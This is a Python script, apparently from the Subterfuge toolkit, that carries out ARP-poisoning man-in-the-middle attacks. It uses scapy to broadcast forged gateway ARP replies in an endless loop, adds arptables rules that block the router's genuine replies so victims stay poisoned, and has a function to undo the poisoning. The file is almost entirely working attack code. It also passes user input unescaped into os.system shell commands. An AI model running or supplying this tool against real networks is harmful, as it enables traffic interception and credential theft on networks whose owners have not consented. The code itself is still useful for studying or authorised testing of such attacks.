#!/usr/bin/python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import os
import re
import sys
sys.path.append('/usr/share/subterfuge')

   #Ignore Deprication Warnings
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

from django.conf import settings
settings.configure(DATABASE_ENGINE="sqlite3",
                   DATABASE_HOST="",
                   DATABASE_NAME= os.path.dirname(os.path.abspath(__file__)).rstrip("abcdefghijklmnnnopqrstruvwxyz") + "db",
                   DATABASE_USER="",
                   DATABASE_PASSWORD="")

from django.db import models
from main.models import *

#Get Globals from Database
for settings in setup.objects.all():
	interface     = settings.iface
	gateway       = settings.gateway
	attackerip    = settings.ip
	routermac     = settings.routermac
	smartarp      = settings.smartarp
	arprate       = int(settings.arprate)

def main():

	#Checks for sane arguments
		if len(sys.argv) < 2:
			print "Invalid Arguments"
			exit()

		#Help menu
		elif sys.argv[1] == "-h" or sys.argv[1] == "--help":
			print "\nARPMITM courtesy of r00t0v3rr1d3 \n"
			print "Usage: python arpmitm.py [OPTIONS] gateway\n"
			print "HELP MENU:"
			print "   -s,--specific 	only poision specific hosts"
			print "   -r,--rearp			Properly rearp network - gateway IP still required"
			print "   -h,--help 			display this message"

		elif sys.argv[1] == "-r" or sys.argv[1] == "--rearp":
			print 'Re-arping the network, removing man-in-the-middle...\n'
			rearp(sys.argv[2])
		elif len(sys.argv) < 3:
			print "Poisoning the entire subnet...\n"
			poisonall(sys.argv[1])

def poisonall(gateway):
	os.system("arp " + gateway + " > " + os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt")
	f = open(os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt", 'r')
	temp = f.readline()
	temp = f.readline()
	try:
	   mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", temp).groups()[0]
	   os.system("arp -s " + gateway + " " + mac)
	   setup.objects.update(routermac = mac)
	   os.system("rm " + os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt")
	   #os.system("echo " + mac + " > " + os.path.dirname(os.path.abspath(__file__)) + "/arpmitm.txt")
	   time.sleep(.5)
	   packet = ARP()
	   packet.op = 2
	   packet.psrc = gateway
	   packet.hwdsk = 'ff:ff:ff:ff:ff:ff'
	   temp2 = gateway.rpartition(".")
	   random = temp2[0]
	   random = random + ".37"
	   packet.pdst = random
	   time.sleep(.5)
	   #do not allow router re-arps through to already poisoned hosts
	   os.system("arptables -F")
	   os.system("arptables -A FORWARD -s " + gateway + " -j DROP")
	   while 1:
	      send(packet, verbose=0)
	      time.sleep(arprate)
	except:
		print 'Unable to determine gateway. Please ensure proper network connectivity and try again.'

def rearp(gateway):
	os.system("arptables -F")
	packet = ARP()
	packet.op = 2
	
	try:
		mac = routermac
		macaddr = mac.rstrip("\n")
		packet.hwsrc = macaddr
		packet.psrc = gateway
		packet.hwdsk = 'ff:ff:ff:ff:ff:ff'
		temp2 = gateway.rpartition(".")
		random = temp2[0]
		random = random + ".37" #random ip  - required
		packet.pdst = random
		for i in range(0,5):
	   		send(packet, verbose=0)
	   		time.sleep(1)
	   		send(packet, verbose=0)
		print 'Network Re-ARP Complete'
		
	except:
		print 'An error occured. Re-ARPing the network failed.'
		
if __name__ == '__main__':
	main()
